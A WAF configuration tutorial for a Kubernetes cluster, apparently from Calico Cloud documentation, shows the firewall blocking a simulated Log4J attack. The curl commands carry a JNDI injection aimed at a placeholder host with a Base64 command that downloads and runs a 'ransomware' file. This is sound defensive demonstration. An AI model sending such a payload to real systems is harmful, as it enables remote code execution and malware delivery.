Configuring the Workload-Centric WAF
==============

A web application firewall (WAF) safeguards web applications against a range of application layer attacks, including cross-site scripting (XSS), SQL injection, and cookie poisoning. Given that application attacks are the primary cause of breaches, protecting the HTTP traffic that serves as a gateway to valuable application data is crucial.

## Step 1 - Set up the WAF

Calico Cloud WAF allows you to selectively run service traffic within your cluster and protect intra-cluster traffic from common HTTP-layer attacks. To increase protection, you can use Calico Cloud network policies to enforce security controls on selected pods on the host.

1. Deploy the WAF by running the following command:

   ```bash
   kubectl apply -f waf
   ```

2. Remove the ```quarantine``` label from the attacker pod

   ``` bash
   kubectl label pod attacker quarantine-
   ```

3. Execute the bash inside the pod attack in way you can interact with its shell prompt:

   ```kubectl exec attacker -it -- /bin/bash ```

   If you no longer have the attacker pod:

   ```kubectl run attacker --image nicolaka/netshoot -it --rm -- /bin/bash```  

4. Before protecting the service with the WAF, try the following command from the attacker shell. This request will simulate a LOG4J attack.

   ```bash
   curl -v -H \
     'X-Api-Version: ${jndi:ldap://jndi-exploit.attack:1389/Basic/Command/Base64/d2dldCBldmlsZG9lci54eXovcmFuc29td2FyZTtjaG1vZCAreCAvcmFuc29td2FyZTsuL3JhbnNvbXdhcmU=}' \
     'vote.vote'
   ```

You should get a response like this:

``` html
> GET / HTTP/1.1
> Host: vote.vote
> User-Agent: curl/8.0.1
> Accept: */*
> X-Api-Version: ${jndi:ldap://jndi-exploit.attack:1389/Basic/Command/Base64/d2dldCBldmlsZG9lci54eXovcmFuc29td2FyZTtjaG1vZCAreCAvcmFuc29td2FyZTsuL3JhbnNvbXdhcmU=}
> 
< HTTP/1.1 200 OK
< server: envoy
< date: Mon, 08 Jan 2024 23:25:22 GMT
< content-type: text/html; charset=utf-8
< content-length: 1294
< set-cookie: voter_id=9b62d5409a1658a; Path=/
< x-envoy-upstream-service-time: 9
< 
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>Cats vs Dogs!</title>
    <base href="/index.html">
    <meta name = "viewport" content = "width=device-width, initial-scale = 1.0">
    <meta name="keywords" content="docker-compose, docker, stack">
    <meta name="author" content="Tutum dev team">
    <link rel='stylesheet' href="/static/stylesheets/style.css" />
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
  </head>
  <body>
    <div id="content-container">
      <div id="content-container-center">
        <h3>Cats vs Dogs!</h3>
        <form id="choice" name='form' method="POST" action="/">
          <button id="a" type="submit" name="vote" class="a" value="a">Cats</button>
          <button id="b" type="submit" name="vote" class="b" value="b">Dogs</button>
        </form>
        <div id="tip">
          (Tip: you can change your vote)
        </div>
        <div id="hostname">
          Processed by container ID vote-69dc45b49c-7htfc
        </div>
      </div>
    </div>
    <script src="http://code.jquery.com/jquery-latest.min.js" type="text/javascript"></script>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery-cookie/1.4.1/jquery.cookie.js"></script>

    
  </body>
</html>* Connection #0 to host vote.vote left intact
```


5. Now enable the WAF using the following command from your shell (not from the pod attacker).

   ```bash
   kubectl patch applicationlayer tigera-secure --type='merge' -p '{"spec":{"webApplicationFirewall":"Enabled"}}'
   ```

6. Go back to the attack pod, and repeat the request.

   ```bash
   curl -v -H \
   'X-Api-Version: ${jndi:ldap://jndi-exploit.attack:1389/Basic/Command/Base64/d2dldCBldmlsZG9lci54eXovcmFuc29td2FyZTtjaG1vZCAreCAvcmFuc29td2FyZTsuL3JhbnNvbXdhcmU=}' \
   'vote.vote'
   ```

   You will note that the result will be an HTTP 403 - Forbidden. This reponse returns from the WAF.

   ``` html
   > GET / HTTP/1.1
   > Host: vote.vote
   > User-Agent: curl/8.0.1
   > Accept: */*
   > X-Api-Version: ${jndi:ldap://jndi-exploit.attack:1389/Basic/Command/Base64/d2dldCBldmlsZG9lci54eXovcmFuc29td2FyZTtjaG1vZCAreCAvcmFuc29td2FyZTsuL3JhbnNvbXdhcmU=}
   > 
   < HTTP/1.1 403 Forbidden
   < date: Mon, 08 Jan 2024 23:27:03 GMT
   < server: envoy
   < content-length: 0
   < 
   * Connection #0 to host vote.vote left intact
   ```

